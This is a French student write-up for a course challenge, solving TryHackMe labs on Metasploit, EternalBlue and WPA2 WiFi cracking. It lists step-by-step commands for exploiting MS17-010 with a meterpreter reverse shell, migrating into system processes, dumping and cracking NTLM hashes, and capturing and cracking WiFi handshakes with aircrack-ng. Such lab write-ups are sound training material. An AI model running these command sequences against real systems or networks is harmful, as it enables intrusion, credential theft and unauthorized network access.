# Challenge C504 19/03/2026

## 🧑‍🏫 Pitch de l’exercice

Le challenge du jour consiste à mettre en pratique vos compétences offensives en maîtrisant le framework Metasploit, l'exploitation de la faille EternalBlue, le piratage de réseaux Wi-Fi et l'élévation de privilèges sous Linux en bonus !

Réaliser les labs suivants sur TryHackMe :

- Metasploit <https://tryhackme.com/room/metasploitintro>
- Eternal Blue <https://tryhackme.com/room/blue> (optionnel)
- Wifi Hack <https://tryhackme.com/room/wifihacking101>
- Linux Privilege <https://tryhackme.com/room/linprivesc> (optionnel)

[Cours C504.](/RESUME.md#️-c504---vulnérabilités-attaques-wi-fi-et-sécurité-active-directory)

> 📚 **Ressources** :
>

---

## 💾 Résolution Lab Metasploit Framework

[TryHackMe - Metasploit Introduction](https://tryhackme.com/module/metasploit)

### **Task 1 : Introduction to Metasploit**

- **Concept :** Présentation du framework le plus utilisé en pentest, couvrant toutes les phases (de la reconnaissance à la post-exploitation).
- **Versions :** Metasploit Pro (payant, avec interface graphique) et Metasploit Framework (gratuit, open-source, en ligne de commande via `msfconsole`).

### **Task 2 : Main Components of Metasploit**

- **Composants :** Le framework se divise en 3 piliers : la console (`msfconsole`), les modules (exploits, payloads, scanners) et les outils annexes (comme `msfvenom`).
- **Vocabulaire :** * *Vulnerability* : La faille système.
  - *Exploit* : Le code qui attaque la faille.
  - *Payload* : Le code (Single ou Staged) qui s'exécute après l'exploitation pour atteindre ton but.

### **Task 3 : Msfconsole**

- **Fonctionnement :** C'est un terminal spécifique fonctionnant par "contexte". Quand on sélectionne un exploit, on "entre" dedans.
- **Navigation :** Utilisation des commandes `search` (pour trouver un module via mot-clé ou CVE), `use` (pour le sélectionner), `info` (pour lire ses détails et sa fiabilité/rank) et `back` (pour quitter le module). L'auto-complétion (touche TAB) est ton meilleure amie.

![console](/images/2026-03-19-19-35-18.png)

### **Task 4 : Working with modules**

- **Configuration :** Une fois dans un module, on utilise `show options` pour voir les paramètres requis (comme RHOSTS pour l'IP cible ou LPORT pour le port local).
- **Variables :** On assigne les valeurs avec `set` (valeur locale au module) ou `setg` (valeur globale conservée entre les modules).
- **Action :** On lance l'attaque avec `exploit` (ou `run`), et on peut gérer les accès obtenus avec `background` (pour masquer la session) et `sessions -i` (pour interagir avec une cible piratée).

### **Task 5 : Summary**

- **Conclusion :** Metasploit simplifie l'attaque en 3 étapes : trouver l'exploit, le personnaliser, et l'exécuter.

---

## 📝 Fiche Récap : Commandes Essentielles Metasploit

### **1. Le Vocabulaire de base**

- **Vulnerability (Vulnérabilité) :** Une faille de conception ou de code sur le système cible.
- **Exploit :** Le bout de code qui tire parti de cette vulnérabilité (le bélier).
- **Payload (Charge utile) :** Le code qui s'exécute sur la cible une fois la faille exploitée pour obtenir un accès.
  - *Singles :* Payloads autonomes, tout-en-un (ex: `.../pingback_reverse_tcp`).
  - *Staged :* Payloads envoyés en plusieurs petits morceaux (ex: `.../meterpreter/reverse_tcp`).

### **2. Navigation et Recherche (msfconsole)**

- **`msfconsole`** : Lance le framework Metasploit depuis ton terminal.
- **`search <mot-clé>`** : Cherche un module (ex: `search apache`, `search type:auxiliary telnet`, `search ms17-010`).
- **`use <chemin_ou_numero>`** : Sélectionne un module et entre dans son "contexte".
- **`info`** : Affiche les détails complets du module sélectionné (auteur, description, fiabilité/rank).
- **`back`** : Quitte le module actuel pour revenir au menu principal.

### **3. Configuration des paramètres**

- **`show options`** : Affiche les paramètres requis pour faire fonctionner le module (RHOSTS, LPORT, etc.).
- **`show payloads`** : Affiche les charges utiles compatibles avec ton exploit actuel.
- **`set <paramètre> <valeur>`** : Configure une option (ex: `set LPORT 6666`).
- **`setg <paramètre> <valeur>`** : Configure une option *globalement* pour qu'elle reste sauvegardée (ex: `setg RHOSTS 10.10.19.23`).
- **`unset <paramètre>`** (ou `unset all`) : Efface la valeur d'un ou plusieurs paramètres.

### **4. Exploitation et Gestion des Sessions**

- **`exploit`** (ou `run`) : Lance l'attaque.
- **`exploit -z`** : Lance l'attaque et met directement la session en arrière-plan dès qu'elle s'ouvre.
- **`background`** (ou `CTRL+Z`) : Met ta session active en arrière-plan pour te rendre la main sur la console Metasploit.
- **`sessions`** : Liste toutes les sessions (machines compromises) actives en arrière-plan.
- **`sessions -i <ID>`** : Interagit avec une session spécifique pour reprendre le contrôle (ex: `sessions -i 2`).

---

## 🟦 Résolution Lab Ethernal Blue

[TryHackMe - Blue (Exploitation EternalBlue)](https://tryhackme.com/room/blue)

![blue](/images/2026-03-19-18-14-26.png)

### **Task 1 : Recon (Reconnaissance)**

- **Objectif :** Scanner la cible pour identifier les services et les vulnérabilités.
- **Action :** Utilisation de `nmap -sS -sV --script vuln <IP_Cible>`.
- **Résultat :** Découverte des ports ouverts (135, 139, 445) et confirmation de la vulnérabilité critique **MS17-010** (EternalBlue) sur le service SMBv1.

![scan](/images/2026-03-19-18-26-01.png)

### **Task 2 : Gain Access (Intrusion)**

- **Objectif :** Exploiter la faille pour obtenir un accès à la machine.
- **Action :** Utilisation de Metasploit avec le module `exploit/windows/smb/ms17_010_eternalblue` et le payload `windows/x64/meterpreter/reverse_tcp`.
- **Résultat :** Obtention d'un shell **Meterpreter** direct sur la cible.

![config](/images/2026-03-19-18-49-15.png)

![win](/images/2026-03-19-18-54-36.png)

### **Task 3 : Escalate (Élévation et Stabilisation)**

- **Objectif :** S'assurer d'avoir les droits maximums et un accès stable qui ne plantera pas.
- **Action :** Vérification des droits (déjà `NT AUTHORITY\SYSTEM`). Pour stabiliser, on liste les processus système en cours et on "migre" notre virus à l'intérieur de l'un d'eux (ex: `spoolsv.exe` ou `lsass.exe`).

![migrate](/images/2026-03-19-19-02-13.png)

### **Task 4 : Cracking (Vol de mots de passe)**

- **Objectif :** Récupérer les mots de passe des utilisateurs de la machine.
- **Action :** Dump de la base SAM de Windows pour récupérer les empreintes (hashs) NTLM de l'utilisateur "Jon".
- **Cassage :** Utilisation de John The Ripper en local avec le dictionnaire `rockyou.txt` pour casser l'empreinte et obtenir le mot de passe en clair.

![hashdump](/images/2026-03-19-19-08-52.png)

![rockyou](/images/2026-03-19-19-14-31.png)

### **Task 5 : Find flags (Fouille du système)**

- **Objectif :** Prouver la compromission totale en trouvant des fichiers cachés.
- **Action :** Utilisation de la fonction de recherche globale de Meterpreter pour localiser et lire les fichiers textes cachés à la racine (`C:\`), dans la base de configuration (`System32\config`) et dans les dossiers utilisateurs (`Users\...\Documents`).

![badge](/images/2026-03-19-19-27-39.png)

## 📝 Fiche Récap : Workflow Metasploit (Cas Pratique MS17-010)

Voici l'ordre exact et les commandes utilisées pour compromettre un serveur Windows de A à Z avec Metasploit :

### **1. Préparation de l'attaque**

- `msfconsole` : Démarrer le framework.
- `search ms17-010` : Trouver l'exploit correspondant à la faille.
- `use exploit/windows/smb/ms17_010_eternalblue` : Sélectionner le module.

### **2. Configuration des paramètres**

- `set RHOSTS <IP_Cible>` : Définir l'adresse de la victime.
- `set LHOST <IP_VPN_Attaquant>` : Définir notre adresse pour le retour de connexion.
- `set payload windows/x64/meterpreter/reverse_tcp` : Forcer l'utilisation d'un shell avancé (Meterpreter).
- `show options` : Vérifier que tout est correctement paramétré.
- `exploit` (ou `run`) : Lancer l'attaque.

### **3. Stabilisation dans Meterpreter**

- `getuid` : Vérifier nos privilèges (idéalement `NT AUTHORITY\SYSTEM`).
- `ps` : Lister les processus tournant sur la machine cible.
- `migrate <PID>` : Déplacer discrètement notre session dans un processus stable (ex: un processus système légitime).

### **4. Post-Exploitation (Pillage)**

- `hashdump` : Extraire basiquement les empreintes de mots de passe à l'écran.
- *Alternative Pro :* `run post/windows/gather/smart_hashdump` : Extrait et sauvegarde automatiquement les hashs dans un fichier texte (Loot) sur notre machine Kali.

### **5. Navigation et Recherche Système**

- `search -f flag*.txt` : Chercher un fichier spécifique sur tout le disque dur.
- `cat C:/chemin/vers/le/fichier.txt` : Lire le contenu du fichier (attention à utiliser des `/` ou des `\\`).

### **6. Cassage de mots de passe (Hors Metasploit, sur le terminal Kali)**

- `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` : Décompresser le dictionnaire (à faire une seule fois).
- `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` : Lancer l'attaque par dictionnaire sur l'empreinte volée.

---

## 🎯 Résolution Lab Wifi Aircrack-ng

[TryHackMe - Wifi Hacking 101](https://tryhackme.com/room/wifihacking101)

### **Task 1 : The basics - An Intro to WPA**

- **Concept :** Les réseaux WPA/WPA2 "Personal" (ceux de nos box internet avec une clé PSK - Pre-Shared Key) n'envoient jamais le mot de passe en clair. L'authentification se fait via un échange cryptographique appelé **4-way handshake**.
- **Vulnérabilité :** La seule méthode d'attaque consiste à capturer ce *handshake*, puis à faire une attaque par **force brute** (ou dictionnaire) hors-ligne.
- **Limites :** Un mot de passe WPA2 fait au minimum 8 caractères. Cette attaque classique ne fonctionne pas sur le WPA2-EAP (réseaux d'entreprises utilisant un serveur RADIUS).

### **Task 2 : You're being watched - Capturing packets to attack**

- **Objectif :** Écouter les ondes Wi-Fi environnantes pour intercepter le fameux *handshake* lorsqu'un appareil se connecte à la box.
- **Méthode :** Il faut passer sa carte Wi-Fi physique en mode "Monitor" (espion). Ensuite, on cible spécifiquement l'adresse MAC (BSSID) de la box cible et son canal d'émission pour enregistrer tout son trafic dans un fichier de capture (`.cap`).

### **Task 3 : Aircrack-ng - Let's Get Cracking**

- **Objectif :** Casser le mot de passe contenu dans le fichier de capture.
- **Méthode :** On utilise la puissance de calcul de notre machine pour tester des millions de mots de passe d'un dictionnaire (comme `rockyou.txt`) contre le *handshake*.
- **Vitesse :** Pour aller encore plus vite, on peut utiliser la puissance d'une carte graphique (GPU) avec un outil comme *Hashcat*, ce qui nécessite de convertir le fichier `.cap` en `.hccapx` (via l'option `-j`).
- **Résultat :** Mot de passe de la box *James Honor 8* trouvé en quelques secondes : `xxxxxxxxxxxx`.

![crack](/images/2026-03-19-23-46-02.png)

---

## 📝 Fiche Récap : Suite Aircrack-ng (Attaque WPA/WPA2)

Voici le workflow complet et les commandes pour pirater un réseau Wi-Fi de type WPA2-PSK.

### **1. Préparation de la carte réseau (airmon-ng)**

- `airmon-ng check kill` : Tue tous les processus Linux (comme NetworkManager) qui pourraient interférer avec l'écoute du Wi-Fi.
- `airmon-ng start wlan0` : Passe la carte Wi-Fi `wlan0` en mode espion (monitor mode). La carte s'appelle désormais souvent `wlan0mon`.

### **2. Repérage et Capture (airodump-ng)**

- `airodump-ng wlan0mon` : Lance le radar global. Affiche tous les réseaux Wi-Fi autour de toi avec leur adresse MAC (BSSID) et leur canal (CH).
- `airodump-ng --bssid <ADRESSE_MAC> --channel <NUM_CANAL> -w <nom_fichier> wlan0mon` :
  - Cible une box précise.
  - Écoute sur le bon canal.
  - `-w` enregistre tous les paquets interceptés dans un fichier (qui aura l'extension `.cap`).
  - *But : Attendre qu'un "WPA Handshake" s'affiche en haut à droite de l'écran.*

### **3. Cassage du mot de passe (aircrack-ng)**

- `aircrack-ng -b <ADRESSE_MAC_CIBLE> -w /chemin/vers/dictionnaire.txt <fichier_capture.cap>` :
  - Lance l'attaque par dictionnaire (ex: avec `/usr/share/wordlists/rockyou.txt`) contre le handshake capturé.
  - `-b` permet de préciser quelle box attaquer si le fichier de capture contient plusieurs réseaux.

---

## 🎯 Résolution Lab Linux Privilege

[TryHackMe - Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

TBC...
